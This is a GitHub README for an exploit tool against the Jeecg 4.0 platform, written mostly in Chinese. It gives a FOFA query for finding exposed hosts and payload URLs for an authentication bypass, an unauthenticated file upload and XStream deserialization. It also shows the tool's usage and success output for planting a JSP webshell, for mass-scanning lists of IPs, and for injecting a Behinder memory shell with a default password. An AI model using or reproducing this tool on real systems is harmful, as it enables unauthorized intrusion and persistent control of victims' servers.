#  Jeecg4.0 GetShell
## fofa

```
body="JEECG版权所有 v_4.0" || title="Jeecg 快速开发平台"
```
## Bypass_authorized 

### payload

```
http://ip:port/api/../xxxxxx
```

### poc

正常请求

![image-20220825124856083](https://github.com/R4gd0ll/Jeecg_v4.0_getshell/blob/main/images/1.png)

未授权请求

![image-20220825124932019](https://github.com/R4gd0ll/Jeecg_v4.0_getshell/blob/main/images/2.png)

## File_upload

### payload

```
http://ip:port/iconController.do?saveOrUpdateIcon
```

### poc

![image-20220825125237074](https://github.com/R4gd0ll/Jeecg_v4.0_getshell/blob/main/images/3.png)

### webshell_url

```
http://ip:port/plug-in/accordion/images/x.xxx
```

## Xstream_deserialize

### payload

```
http://ip:port/cgformSqlController.do?doMigrateIn
```

### xstream_payload

```
http://x-stream.github.io/CVE-2021-39149.html
```

### poc

![image-20220825130714206](https://github.com/R4gd0ll/Jeecg_v4.0_getshell/blob/main/images/4.png)

## Jeecg_v4.0_getshell

```
  Title  :  Jeecg4.0 GetShell
  Author  :  R4gd0ll
  Usage  :  python3 jeecg_v4.0_getshell.py -h

  -h --help    打开帮助
  -u --url     对单个ip进行测试
  -f --file    对文件中的所有ip进行测试
  -m --msmurl  注入冰蝎内存马(默认连接密码reyebond,支持4.0,仅支持单独ip测试)
```

### help

```
C:\jeecg>python3 jeecg_v4.0_getshell.py -h

    -------------------------------------------------------------------------
    Title   :   Jeecg4.0 GetShell
    Author  :   R4gd0ll
    Usage   :   python3 jeecg_v4.0_getshell.py -h

    -h --help     打开帮助
    -u --url      对单个ip进行测试
    -f --file     对文件中的所有ip进行测试
    -m --msmurl   注入冰蝎内存马(默认连接密码reyebond,支持4.0,仅支持单独ip测试)
    -------------------------------------------------------------------------
```

### url

```
C:\jeecg>python3 jeecg_v4.0_getshell.py -u http://127.0.0.1:8080/jeecg

[+] getshell success, webshell地址:http://127.0.0.1:8080/jeecg/plug-in/accordion/images/1.jsp
```

![image-20220825133223937](https://github.com/R4gd0ll/Jeecg_v4.0_getshell/blob/main/images/5.png)

### msmurl

```
C:\jeecg>python3 jeecg_v4.0_getshell.py -m http://127.0.0.1:8080/jeecg/

Behinder msmshell success
```

![image-20220825133349259](https://github.com/R4gd0ll/Jeecg_v4.0_getshell/blob/main/images/6.png)

### file

```
C:\jeecg>python3 jeecg_v4.0_getshell.py -f 1.txt
[-] getshell fail
[-] getshell fail
[-] 访问出现错误！
[-] 访问出现错误！
[-] getshell fail
[+] getshell success, webshell地址:http://xxxxx/plug-in/accordion/images/1.jsp
[+] getshell success, webshell地址:http://xxxxx//plug-in/accordion/images/1.jsp
```

